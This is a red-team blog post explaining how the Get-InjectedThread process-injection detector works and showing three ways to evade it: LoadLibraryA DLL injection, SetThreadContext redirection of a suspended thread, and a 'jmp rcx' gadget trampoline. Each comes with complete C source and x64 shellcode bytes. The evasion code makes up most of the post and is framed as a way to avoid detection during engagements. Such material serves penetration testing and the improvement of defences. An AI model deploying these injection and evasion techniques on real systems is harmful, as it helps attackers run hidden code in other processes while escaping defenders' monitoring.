# https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/

[Twitter](https://twitter.com/_xpn_ "Twitter") [GitHub](https://github.com/xpn "GitHub") [LinkedIn](https://linkedin.com/in/xpn "LinkedIn") [RSS](https://blog.xpnsec.com/rss/ "RSS Feed") [Instagram](https://www.instagram.com/xpnsecpub "Instagram")

[« Back to home](https://blog.xpnsec.com/ "Back to homepage")

# Understanding and Evading Get-InjectedThread

![Understanding and Evading Get-InjectedThread](https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/bypass3-1.png)

Posted on 9th April 2018

* * *

[redteam](https://blog.xpnsec.com/tags#redteam) [windows](https://blog.xpnsec.com/tags#windows)

7 min read


One of the many areas of this field that I really enjoy is the “cat and mouse” game played between RedTeam and BlueTeam, each forcing the other to up their game. Often we see some awesome tools being released to help defenders detect malware or shellcode execution, and knowing just how these defensive capabilities function is important when performing a successful pentest or RedTeam engagement.

Recently I came across the awesome post “Defenders Think in Graphs Too!”, which can be found over on the SpectreOps blog [here](https://posts.specterops.io/defenders-think-in-graphs-too-part-1-572524c71e91). This post is the start of a series looking at “data acquisition, data quality, and data analysis through a case study focused on detecting Process Injection”. If you haven’t read it, I highly recommend that you do.

One of the tools discussed in the post is “Get-InjectedThread”, a Powershell script capable of enumerating running processes and displaying information on any that it believes have been victim to process injection. The tool can be found over on GitHub [here](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2).

One thing I thought of when I saw this tool, was just how I would go about bypassing detection if I encountered it during an engagement. Also, with an interest in this area of Windows security, I really wanted a good starting point to build on when this detection technique evolves, either through the next iteration of `Get-InjectedThread`, or through other tools intergrating the same method. This post will go through a few different techniques to help us understand just how we could bypass this kind of analysis.

## [Can we avoid detection?](https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/\#Can-we-avoid-detection "Can we avoid detection?") Can we avoid detection?

Typically, when attempting to execute code in another process, the `VirtualAllocEx` -\> `WriteProcessMemory` -\> `CreateRemoteThread` chain is used. Let’s take a quick look at `Get-InjectedThread` in action, by first injecting shellcode into a process, and then running `Get-InjectedThread`:

![get-injectedthread_example](https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/get-injectedthread_example.png)

… I did say Get-InjectedThread was awesome didn’t I :).

Here we see that shellcode injected into cmd.exe is caught and displayed to the user, giving an indication that something is suspicious.

The way that `Get-InjectedThread` achieves this is by analysing running threads on a system. The memory associated with the start address of the thread is then enumerated, and if the memory is found to be missing the `MEM_IMAGE` flag, the tool indicates that the thread is likely running from dynamically allocated memory (most likely from a `VirtualAllocEx` call or similar), rather than being spawned from a DLL or EXE… pretty cool.

Now, let’s review the code to see just how these checks are performed:

```
function Get-InjectedThread
{
...
$hSnapshot = CreateToolhelp32Snapshot -ProcessId 0 -Flags 4

$Thread = Thread32First -SnapshotHandle $hSnapshot
do
{
    $proc = Get-Process -Id $Thread.th32OwnerProcessId

    if($Thread.th32OwnerProcessId -ne 0 -and $Thread.th32OwnerProcessId -ne 4)
    {
        $hThread = OpenThread -ThreadId $Thread.th32ThreadID -DesiredAccess $THREAD_ALL_ACCESS -InheritHandle $false
        if($hThread -ne 0)
        {
            $BaseAddress = NtQueryInformationThread -ThreadHandle $hThread
            $hProcess = OpenProcess -ProcessId $Thread.th32OwnerProcessID -DesiredAccess $PROCESS_ALL_ACCESS -InheritHandle $false

            if($hProcess -ne 0)
            {
                $memory_basic_info = VirtualQueryEx -ProcessHandle $hProcess -BaseAddress $BaseAddress
                $AllocatedMemoryProtection = $memory_basic_info.AllocationProtect -as $MemProtection
                $MemoryProtection = $memory_basic_info.Protect -as $MemProtection
                $MemoryState = $memory_basic_info.State -as $MemState
                $MemoryType = $memory_basic_info.Type -as $MemType

                if($MemoryState -eq $MemState::MEM_COMMIT -and $MemoryType -ne $MemType::MEM_IMAGE)
                {
                ...
```

Reading the above, there are a number of areas that stand out. The first is:

```
$BaseAddress = NtQueryInformationThread -ThreadHandle $hThread
```

This command is responsible for retrieving the entry address of the running thread. When injecting shellcode, this would typically be the address provided to the `CreateRemoteThread` call. For example:

```
threadHandle = CreateRemoteThread(
    processHandle,
    NULL,
    0,
    BASE_ADDRESS,
    NULL,
    CREATE_SUSPENDED,
    NULL
    );
```

The second interesting call is:

```
$memory_basic_info = VirtualQueryEx -ProcessHandle $hProcess -BaseAddress $BaseAddress
```

This line is making a call to the Win32 function `VirtualQueryEx`, which returns information on the memory allocation associated with the running thread’s base address. Information such as memory protection, length, flags etc..

This information is then used in the following command:

```
if($MemoryState -eq $MemState::MEM_COMMIT -and $MemoryType -ne $MemType::MEM_IMAGE)
```

Here we see a final check to see if the thread’s base address has the `MEM_COMMIT` flag and is missing the `MEM_IMAGE` flag. If this is true, it is highly likely that this is a thread injected and running from dynamic memory, which the tool then highlights.

With this in mind, let’s see if there are any methods in which we can bypass these checks, and stay under the radar during an assessment.

## [Inject DLL via LoadLibrary](https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/\#Inject-DLL-via-LoadLibrary "Inject DLL via LoadLibrary") Inject DLL via LoadLibrary

The first way we will attempt to avoid being caught, is by adding our shellcode to a DLL, and then using `LoadLibraryA` as our entrypoint. By doing this we can bypass the following check, as our entry point is actually within `MEM_IMAGE` flagged memory:

```
if($MemoryState -eq $MemState::MEM_COMMIT -and $MemoryType -ne $MemType::MEM_IMAGE)
```

To target `LoadLibraryA`, we will need to complete the following steps:

1. Get the address of the `LoadLibraryA` call.
2. Allocate memory within our target process.
3. Write the path of our DLL into the allocated memory.
4. Make a call to start a new thread, with the entry point af `LoadLibraryA`, passing the DLL path memory address as an argument.

This will look something like this:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/)

|     |     |
| --- | --- |
|  | intexample\_loadlibrary(intpid) { |
|  |  |
|  | charcurrentDir\[MAX\_PATH\]; |
|  | SIZE\_TbytesWritten=0; |
|  |  |
|  | HANDLEprocessHandle=OpenProcess(PROCESS\_ALL\_ACCESS, false, pid); |
|  | if (processHandle==INVALID\_HANDLE\_VALUE) { |
|  | printf("\[X\] Error: Could not open process with PID %d\\n", pid); |
|  | return1; |
|  | } |
|  |  |
|  | void\*alloc=VirtualAllocEx(processHandle, 0, 4096, MEM\_COMMIT \| MEM\_RESERVE, PAGE\_READWRITE); |
|  | if (alloc==NULL) { |
|  | printf("\[X\] Error: Could not allocate memory in process\\n"); |
|  | return1; |
|  | } |
|  |  |
|  | void\*\_loadLibrary=GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA"); |
|  | if (\_loadLibrary==NULL) { |
|  | printf("\[X\] Error: Could not find address of LoadLibrary\\n"); |
|  | return1; |
|  | } |
|  |  |
|  | GetCurrentDirectoryA(MAX\_PATH, currentDir); |
|  | strncat\_s(currentDir, "\\\injectme.dll", MAX\_PATH); |
|  |  |
|  | printf("\[\*\] Injecting path to load DLL: %s\\n", currentDir); |
|  |  |
|  | if (!WriteProcessMemory(processHandle, alloc, currentDir, strlen(currentDir) +1, &bytesWritten)) { |
|  | printf("\[X\] Error: Could not write into process memory\\n"); |
|  | return2; |
|  | } |
|  | printf("\[\*\] Written %d bytes\\n", bytesWritten); |
|  |  |
|  | if (CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD\_START\_ROUTINE)\_loadLibrary, alloc, 0, NULL) ==NULL) { |
|  | printf("\[X\] Error: CreateRemoteThread failed \[%d\] :(\\n", GetLastError()); |
|  | return2; |
|  | } |
|  | } |

[view raw](https://gist.github.com/xpn/0046ea13c828ddcacadd38d01f07b63d/raw/ed655d6f286bc11aae008b464f2f5098f20253d8/get_injectedthread-example_dll.c) [get\_injectedthread-example\_dll.c](https://gist.github.com/xpn/0046ea13c828ddcacadd38d01f07b63d#file-get_injectedthread-example_dll-c)
hosted with ❤ by [GitHub](https://github.com/)

Let’s give this a shot by making a call to `MessageBoxA` from our injected DLL:

![bypass1](https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/bypass1.png)

Here we see that we have successfully injected our shellcode into cmd.exe, which launches the message box. More so, we are not picked up during `Get-InjectedThread`‘s run.

There is of course an obvious weakness to this technique, in that we need to drop a DLL onto disk to perform injection, increasing our shellcode’s chances of being discovered… however it’s a good starting point.

Let’s see if we can do anything else.

## [SetThreadContext](https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/\#SetThreadContext "SetThreadContext") SetThreadContext

We now know that a good way to stay under the radar is to have our thread’s entry address set to a memory region containing the `MEM_IMAGE` flag. But what about if we update the entrypoint of our thread just before starting, would this be enough to evade detection?

In this example, we will look to leverage the `SetThreadContext` call to redirect execution to our injected shellcode, using the following steps:

1. Allocate memory in the target process to hold our shellcode.
2. Copy our shellcode into the allocated memory.
3. Spawn a suspended thread, with the ThreadProc set to any `MEM_IMAGE` flagged memory region.
4. Retrieve the current registers for the suspended thread.
5. Update the RIP register to point to our shellcode residing in allocated memory.
6. Resume execution.

The theory here is that our thread’s base address will be that of a `MEM_IMAGE` flagged memory region, even though we never actually execute code from this address. Then by setting the `rip` register to point to our shellcode, we achieve execution whilst hopefully bypassing `Get-InjectedThread`. Our code will look like this:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/)

|     |     |
| --- | --- |
|  | unsigned charshellcode\[256\] = { |
|  | 0x90, 0x90, 0x90, 0x90, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x31, 0xc9, 0x48, 0x8d, 0x15, |
|  | 0x14, 0x00, 0x00, 0x00, 0x49, 0x89, 0xd0, 0x4d, 0x31, 0xc9, |
|  | 0x48, 0xb8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, |
|  | 0xff, 0xd0, 0xeb, 0xfe, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, |
|  | 0x20, 0x54, 0x65, 0x73, 0x74, 0x00, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff |
|  | }; |
|  |  |
|  | intexample\_switchsuspend(intpid) { |
|  | charcurrentDir\[MAX\_PATH\]; |
|  | SIZE\_TbytesWritten=0; |
|  | HANDLEthreadHandle; |
|  |  |
|  | HANDLEprocessHandle=OpenProcess(PROCESS\_ALL\_ACCESS, false, pid); |
|  | if (processHandle==INVALID\_HANDLE\_VALUE) { |
|  | printf("\[X\] Error: Could not open process with PID %d\\n", pid); |
|  | return1; |
|  | } |
|  |  |
|  | void\*alloc=VirtualAllocEx(processHandle, 0, 4096, MEM\_COMMIT \| MEM\_RESERVE, PAGE\_EXECUTE\_READWRITE); |
|  | if (alloc==NULL) { |
|  | printf("\[X\] Error: Could not allocate memory in process\\n"); |
|  | return1; |
|  | } |
|  |  |
|  | void\*\_loadLibrary=GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA"); |
|  | if (\_loadLibrary==NULL) { |
|  | printf("\[X\] Error: Could not find address of LoadLibrary\\n"); |
|  | return1; |
|  | } |
|  |  |
|  | \*(DWORD64\*)(shellcode+26) = (DWORD64)GetProcAddress(LoadLibraryA("user32.dll"), "MessageBoxA"); |
|  |  |
|  | if (!WriteProcessMemory(processHandle, alloc, shellcode, sizeof(shellcode), &bytesWritten)) { |
|  | printf("\[X\] Error: Could not write to process memory\\n"); |
|  | return2; |
|  | } |
|  | printf("\[\*\] Written %d bytes to %p\\n", bytesWritten, alloc); |
|  |  |
|  | threadHandle=CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD\_START\_ROUTINE)\_loadLibrary, NULL, CREATE\_SUSPENDED, NULL); |
|  | if (threadHandle==NULL) { |
|  | printf("\[X\] Error: CreateRemoteThread failed \[%d\] :(\\n", GetLastError()); |
|  | return2; |
|  | } |
|  |  |
|  | // Get the current registers set for our thread |
|  | CONTEXTctx; |
|  | ZeroMemory(&ctx, sizeof(CONTEXT)); |
|  | ctx.ContextFlags=CONTEXT\_CONTROL; |
|  | GetThreadContext(threadHandle, &ctx); |
|  |  |
|  | printf("\[\*\] RIP register set to %p\\n", ctx.Rip); |
|  | printf("\[\*\] Updating RIP to point to our shellcode\\n"); |
|  | ctx.Rip= (DWORD64)alloc; |
|  |  |
|  | printf("\[\*\] Resuming thread execution at our shellcode address\\n"); |
|  | SetThreadContext(threadHandle, &ctx); |
|  | ResumeThread(threadHandle); |
|  | } |

[view raw](https://gist.github.com/xpn/c043b84668334b6fc1131dd3b59ed97f/raw/79310705658742a94cb2c58f01fe443c289ad44d/get_injectedthread-example_setthreadcontext.c) [get\_injectedthread-example\_setthreadcontext.c](https://gist.github.com/xpn/c043b84668334b6fc1131dd3b59ed97f#file-get_injectedthread-example_setthreadcontext-c)
hosted with ❤ by [GitHub](https://github.com/)

Running our example, we see that we have our second method of executing shellcode, injecting our thread into notepad.exe:

![bypass2](https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/bypass2.png)

## [Return Oriented… urm, threading](https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/\#Return-Oriented%E2%80%A6-urm-threading "Return Oriented… urm, threading") Return Oriented… urm, threading

OK, so this one is a bit out of left field… In this example, we will leverage the instructions of an existing `MEM_IMAGE` binary to pass execution to our shellcode (think ROP), so we:

1. Allocate memory in the target process to hold our shellcode.
2. Copy our shellcode into the allocated memory.
3. Hunt for a gadget in the victim process which will trampoline our thread execution into the shellcode.
4. Start our thread with our `ThreadProc` pointing to the gadget.

We know that we will be starting execution of our thread using the `CreateRemoteThread` call, which takes the address of our `ThreadProc` to execute. We also know that we can pass an optional argument to our `ThreadProc`.

On x64 processes, the argument will be passed in the `rcx` register, so how about we hunt for a gadget of:

```
jmp rcx
```

This way, we can set our `ThreadProc` address to the `jmp rcx` gadget, and pass our shellcode address as the argument. Again this meets the requirement of ensuring that our thread’s base address being within a `MEM_IMAGE` section of memory, so should help avoid detection.

Below is an example of how to achieve this:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/)

|     |     |
| --- | --- |
|  | unsigned charshellcode\[256\] = { |
|  | 0x90, 0x90, 0x90, 0x90, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x31, 0xc9, 0x48, 0x8d, 0x15, |
|  | 0x14, 0x00, 0x00, 0x00, 0x49, 0x89, 0xd0, 0x4d, 0x31, 0xc9, |
|  | 0x48, 0xb8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, |
|  | 0xff, 0xd0, 0xeb, 0xfe, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, |
|  | 0x20, 0x54, 0x65, 0x73, 0x74, 0x00, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, |
|  | 0xff, 0xff |
|  | }; |
|  |  |
|  | intexample\_rop(intpid) { |
|  | charcurrentDir\[MAX\_PATH\], buffer\[4096\]; |
|  | SIZE\_TbytesWritten=0, bytesRead=0; |
|  | HANDLEthreadHandle; |
|  | DWORDi=0, j=0, threadId=0; |
|  | void\*retGadget=NULL; |
|  |  |
|  | HANDLEprocessHandle=OpenProcess(PROCESS\_ALL\_ACCESS, false, pid); |
|  | if (processHandle==INVALID\_HANDLE\_VALUE) { |
|  | printf("\[X\] Error: Could not open process with PID %d\\n", pid); |
|  | return1; |
|  | } |
|  |  |
|  | void\*alloc=VirtualAllocEx(processHandle, 0, 4096, MEM\_COMMIT \| MEM\_RESERVE, PAGE\_EXECUTE\_READWRITE); |
|  | if (alloc==NULL) { |
|  | printf("\[X\] Error: Could not allocate memory in process\\n"); |
|  | return1; |
|  | } |
|  |  |
|  | // Update our MessageBoxA shellcode with the API address |
|  | \*(DWORD64\*)(shellcode+26) = (DWORD64)GetProcAddress(LoadLibraryA("user32.dll"), "MessageBoxA"); |
|  |  |
|  | // Test victim process, VBoxTray |
|  | char\*base= (char\*)LoadLibraryA("VBoxTray.exe"); |
|  | if (base==NULL) { |
|  | printf("\[X\] Could not load DLL\\n"); |
|  | return2; |
|  | } |
|  |  |
|  | // Hunting for a JMP RCX (\\xff\\xe1) instruction |
|  | for (i=0; i<100000&&retGadget==NULL; i+=bytesRead) { |
|  | printf("\[\*\] Hunting for gadget at address %p\\n", (char\*)base+i); |
|  | ReadProcessMemory(processHandle, (char\*)base+i, buffer, 4096, &bytesRead); |
|  | for (j=0; j+1<bytesRead&&retGadget==NULL; j++) { |
|  | if (buffer\[j\] =='\\xff'&&buffer\[j+1\] =='\\xe1') { |
|  | retGadget= (char\*)base+i+j; |
|  | } |
|  | } |
|  | } |
|  |  |
|  | if (retGadget==NULL) { |
|  | printf("\[X\] Error: Could not find JMP gadget\\n"); |
|  | return2; |
|  | } |
|  |  |
|  | printf("\[\*\] Found JMP RCX gadget at address %p\\n", retGadget); |
|  |  |
|  | if (!WriteProcessMemory(processHandle, alloc, shellcode, sizeof(shellcode), &bytesWritten)) { |
|  | printf("\[X\] Error writing shellcode into memory\\n"); |
|  | return2; |
|  | } |
|  | printf("\[\*\] Written %d bytes of shellcode to %p\\n", bytesWritten, alloc); |
|  |  |
|  | printf("\[\*\] Starting thread execution\\n"); |
|  | threadHandle=CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD\_START\_ROUTINE)((char\*)retGadget), alloc, 0, &threadId); |
|  | if (threadHandle==NULL) { |
|  | printf("\[X\] Error: CreateRemoteThread failed \[%d\] :(\\n", GetLastError()); |
|  | return2; |
|  | } |
|  |  |
|  | printf("\[\*\] Thread ID %x created\\n", threadId); |
|  | } |

[view raw](https://gist.github.com/xpn/fc7935ab38c781746c9d896f3aec4b08/raw/106b72951f238f78be950cca02c1f4010ea38130/get_injectedthread-example_rop.c) [get\_injectedthread-example\_rop.c](https://gist.github.com/xpn/fc7935ab38c781746c9d896f3aec4b08#file-get_injectedthread-example_rop-c)
hosted with ❤ by [GitHub](https://github.com/)

And when executed, we find that our shellcode can run without being flagged:

![bypass3](https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/bypass3.png)

So there we have it, a few different methods of spawning our thread whilst obscuring the true start address. Hopefully this proves to be useful if you ever come across a similar detection technique. If you have any methods in which the above examples can be detected using `Get-InjectedThreads`, it would be awesome to hear them!

## [More reading](https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/\#More-reading "More reading") More reading

- [Get-InjectedThreads](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
- [EndGame - Hunting in memory](https://www.endgame.com/blog/technical-blog/hunting-memory)
- [Hunting in memory presentation](https://www.sans.org/summit-archives/file/summit-archive-1492714038.pdf)